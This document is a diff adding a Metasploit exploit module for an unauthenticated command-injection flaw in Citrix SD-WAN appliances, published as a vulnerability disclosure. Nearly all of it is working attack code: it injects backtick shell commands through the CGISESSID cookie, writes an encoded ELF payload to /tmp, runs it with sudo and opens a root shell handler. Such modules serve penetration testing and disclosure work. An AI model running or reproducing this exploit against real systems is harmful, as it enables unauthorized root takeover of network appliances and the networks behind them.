@@ -1,0 +1,140 @@
+# Exploit Title: Citix SD-WAN logout cookie preauth Remote Command Injection Vulnerablity 
+# Date: 02/20/2017
+# Exploit Author: xort @ Critical Start
+# Vendor Homepage: www.citrix.com
+# Software Link: https://www.citrix.com/downloads/cloudbridge/
+# Version: 9.1.2.26.561201
+# Tested on: 9.1.2.26.561201 (OS partition 4.6)
+#            
+# CVE : (awaiting cve)
+
+# vuln: CGISESSID Cookie parameter
+#  associated vuln urls:
+#                       /global_data/ 
+#			/global_data/headerdata 
+#			/log
+#			/
+#			/r9-1-2-26-561201/configuration/ 
+#			/r9-1-2-26-561201/configuration/edit 
+#			/r9-1-2-26-561201/configuration/www.citrix.com [CGISESSID cookie]
+#
+# Description PreAuth Remote Root Citrix SD-WAN <= v9.1.2.26.561201. This exploit leverages a command injection bug. 
+#
+# xort @ Critical Start
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+	include  Exploit::Remote::Tcp
+        include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Citrix SD-WAN CGISESSID Cookie Remote Root',
+					'Description'    => %q{
+					This module exploits a remote command execution vulnerability in the Citrix SD-WAN Appliace Version <=  v9.1.2.26.561201. The vulnerability exist in a section of the machine's session checking functionality. If the CGISESSID cookie holds shell-command data - it is used in a call to system where input is processed unsanitized.
+			},
+			'Author'         =>
+				[
+					'xort@Critical Start', # vuln + metasploit module
+				],
+			'Version'        => '$Revision: 1 $',
+			'References'     =>
+				[
+					[ 'none', 'none'],
+				],
+			'Platform'      => [ 'linux'],
+			'Privileged'     => true,
+			 'Arch'          => [ ARCH_X86 ],
+                        'SessionTypes'  => [ 'shell' ],
+		        'Payload'        =>
+                                { 
+                                  'Compat' =>
+                                  {
+                                        'ConnectionType' => 'find',
+                                  }
+                                },
+
+			'Targets'        =>
+				[
+					['Linux Universal',
+						{
+								'Arch' => ARCH_X86,
+								'Platform' => 'linux'
+						}
+					],
+				],
+			'DefaultTarget' => 0))
+
+			register_options(
+				[
+					OptString.new('CMD', [ false, 'Command to execute', "" ]),	
+					Opt::RPORT(443),
+				], self.class)
+	end
+
+	def run_command(cmd)
+
+		vprint_status( "Running Command...\n" )
+
+		# send request with payload	
+		res = send_request_cgi({
+			'method' => 'POST',
+                        'uri'     => "/global_data/",
+			'vars_post' => {
+				'action' => 'logout'
+			},
+ 	                'headers' => {
+                        	'Connection' => 'close',
+                        	'Cookie' => 'CGISESSID=e6f1106605b5e8bee6114a3b5a88c5b4`'+cmd+'`; APNConfigEditorSession=0qnfarge1v62simtqeb300lkc7;',
+                        }
+
+		})
+
+
+		# pause to let things run smoothly
+		sleep(2)
+
+
+	end
+
+	
+	def exploit
+		# timeout
+		timeout = 1550;
+
+		# pause to let things run smoothly
+		sleep(2)
+
+		 #if no 'CMD' string - add code for root shell
+                if not datastore['CMD'].nil? and not datastore['CMD'].empty?
+
+                        cmd = datastore['CMD']
+
+                        # Encode cmd payload
+
+                        encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,'\\\\\\\\\\\\x\1\2')
+
+			# upload elf to /tmp/n , chmod +rx /tmp/n , then run /tmp/n (payload)
+                        run_command("echo -e #{encoded_cmd}>/tmp/n")
+                        run_command("chmod 755 /tmp/n")
+                        run_command("sudo /tmp/n")
+                else
+                        # Encode payload to ELF file for deployment
+                        elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
+                        encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,'\\\\\\\\\\\\x\1\2')
+
+			# upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)
+                        run_command("echo -e #{encoded_elf}>/tmp/m")
+                        run_command("chmod 755 /tmp/m")
+                        run_command("sudo /tmp/m")
+
+			# wait for magic
+                        handler
+			
+                end
+
+
+	end
+end
